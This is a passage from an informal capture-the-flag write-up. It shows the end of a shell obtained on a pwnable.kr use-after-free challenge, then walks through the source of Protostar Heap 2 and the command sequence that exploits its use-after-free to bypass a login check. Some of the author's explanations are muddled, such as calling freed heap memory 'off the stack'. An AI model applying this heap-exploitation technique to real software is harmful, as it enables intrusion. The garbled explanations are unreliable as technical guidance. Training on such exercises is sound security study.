    Version:  4.4.179
    ASLR:     Enabled
[+] Starting remote process './uaf' on pwnable.kr: pid 223277
[*] Switching to interactive mode

$ $ ls
flag  uaf  uaf.cpp
$ $  
```

boom! we have pwned this binary


## Protostar Heap 2

Here is the protostar heap 2, use after free, it will demonstrate an extremely simple use after
free vulnerability, but is still great practice for exploiting and finding this bug class.
This "writeup" is not very structured, as these were just notes that I had taken when solving this
binary.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv) {
  char line[128];

  while(1) {
      printf("[ auth = %p, service = %p ]\n", auth, service);

      if(fgets(line, sizeof(line), stdin) == NULL) break;

      if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }
      if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }
      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
      if(strncmp(line, "login", 5) == 0) {
          if(auth == service) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
  }
}
```

cool little trick i have learned about this script, is that sometimes c programs that take user
input will be stuck in a constant loop, through the while without asking for user input

not sure what causes this, but this script provided us with a solution:

```c
int main(int argc, char**argv {
    char line[128];
    while(1) {
        if(fgets(line, sizeof(line), stdin)==NULL) break;
    }
}
```

this should ensure that the program will not continue until it recieves input

just thought it was a neat little trick since nowhere on the internet does it mention this problem
im sure in some obscure corner there is probably somebody who can deal with info, but i guess i found
it here anyways

anyways, on with reversing the binary, we have the source code so we could just look at it but that
isnt the point of these writeups, i want to understand everything about this vulnerability and about
this binary.

Lets explain what the program is doing from the source code, then match that up with the disassembly

```c
struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;
```

first, it will create a struct called auth, it will have a char array for the name, and an int auth
then we see the struct being initialized, a pointer to an object of struct auth
along with a pointer to a char array named service

now we are at main

```c
int main(int argc, char **argv) {
  char line[128];
  while(1) {
      printf("[ auth = %p, service = %p ]\n", auth, service);

      if(fgets(line, sizeof(line), stdin) == NULL) break;
```

this first section of main will declare our buffer to read our input into with the fgets
this will constantly print out our program status, then read in user input and store it in line
no stack buffer overflow vulnerability here, will only read in 128 bytes

```c
      if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }
```

lets check out the auth check next, it will check if our input is equals to the auth keyword
things may get confusing so let me walk through all the instances of auth
we have a pointer to a struct called auth, and within that struct we have an integer variable
called auth, this is very poor naming btw.

anyways, it will allocate the sizeof auth on the heap, and return the pointer to auth
the only way to know how many bytes it allocated, is to read the dissassembly
it will then zero out auth.

Then will check if the line+5 is less than 31?
this is very random, and i sure hope it serves a purpose later on
if that passes the check, it will then copy that string into auth->name on the heap i presume
it will copy line+5?, line is a char array, so either they are talking about the address
of the char array in memory or i am missing something

anyways lets continue, we can come back to this strange scenario

```c
      if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }
```

this check is simple, it only reads in "reset", and nothing more, if we input reset it will free
auth, completely free it off the stack(may still be stored in thread local cache(tcache))

```c
      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
```

service was our pointer to a char array(string) at the start remember?
lets just think of service as a string, now it will duplicate line+7 into service?
again, my best guess as of right now is that line+7 is incrementing the pointer address by
value 7 in decimal.

```c
      if(strncmp(line, "login", 5) == 0) {
          if(auth == service) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
```

last, we have our login function, this as well only reads in 5 bytes, the size of the string "login"
it will check if the auth struct pointer is equals to service

i assume that our end goal will be to achieve "you have logged in already", since that seems to be the
only string in this binary that seems to represent success and fail

now that we have walked through the code, lets try and find a way to exploit this
this should be a use after free, since we have the ability to free an object, and use the object
on our command

```c
      if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }
```

again, our auth command just for reference, will allocate the size of our auth object
memset/zero out that memory on the heap since malloc does not initialize the data

"we can use calloc to automatically zero out that memory for us, though i dont know if that
function will bring in some complications within the challenge"

it will then check the length of the input, and see if it exceeds the size of auth->name
if all is ok, it will then copy the characters after the auth command will be copied
"auth " will be ignored

reset is simple and needs no further explanation, it will read in "reset", then free auth
nothing else

service is simple as well, so we dont need to step through it, though its got a lot of moving
pieces that need explanations. The service function will read in 6 bytes, the size of "service"
then will change our "string" pointer to strdup(line+7), which means that it will read in the bytes
AFTER your command "service"

lets think of this scenario for example, lets run the program and input:

```
service loser
```

the address of that input string(line), will have an address space, and that address space will be in
base 16(hexadecimal), if we wanted to iterate through that, we could simply move up that address space
since it is a string, or an array of chars it will store that next char in sequential order in memory.
which means that:

```text
line    = service loser
line+7  = loser
```

since service is 6 bytes, and the space counts as a character, we are now at the input after we said
service. Im sure that there is something very very wrong with this solution, but im not one to prod
around with best practice, this works just fine in this scenario i guess :/

the last "function" we have within the binary is "login"
this is pretty simple as well, it will only read in 5 bytes, the size of login to compare it against
our input, if auth->auth is not zero, then it will tell us that

```text
you have logged in already
```

else it will prompt us with

```text
please enter your password
```

that is the only functionality that serves

now that we have fully reviewed these functions(again), since the first time wasnt so coherent
lets(actually) exploit this binary now

first, we look at what "strdup" does, since this is an important function in helping us exploit this

```
"Memory for the new string is obtained with malloc(3), and can be freed with free(3)"
```

so it allocates the new string in the heap?, very interesting, very interesting indeed
so we have a way to write what we want onto the heap

so now that we know this, the solution to the challenge is this:

1. we must first initialize the auth struct on the heap, since login requires the pointer to it

2. then, after our pointer to auth gets updated, we can free it
a quick note: free() will not destroy the pointer, so after we free() auth, the pointer will still
remain, so it still believes that *auth->name and *auth->auth still exists on that address
but we know better right?, we know that we had just free'd it off the heap, its gone, only the pointer
to that empty address remains
lets play with that

3. after our free, we can write to the heap with "service"
we will be able to write to the same area that auth was allocated, since we had free'd it we will be
able to write over the addresses to where auth is pointing to
now all we have to do, is to write to the heap using service:

```bash
[ auth = (nil), service = (nil) ]
auth a

[ auth = 0x87c9818, service = (nil) ]
reset

[ auth = 0x87c9818, service = (nil) ]
service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

[ auth = 0x87c9818, service = 0x87c9828 ]
login
you have logged in already!
```

boom!
we have logged in already, we have solved this binary


sources:
```
https://class.osiris.cyber.nyu.edu/files/745b9f79d33e7e8c2d293804b8b0823a/heap2.pdf
https://github.com/shellphish/how2heap
https://wiki.x10sec.org/pwn/linux/glibc-heap/implementation/tcache/
https://github.com/sunghun7511/how2heap-study
https://payatu.com/blog/Gaurav-Nayak/introduction-of-tcache-bins-in-heap-management
```
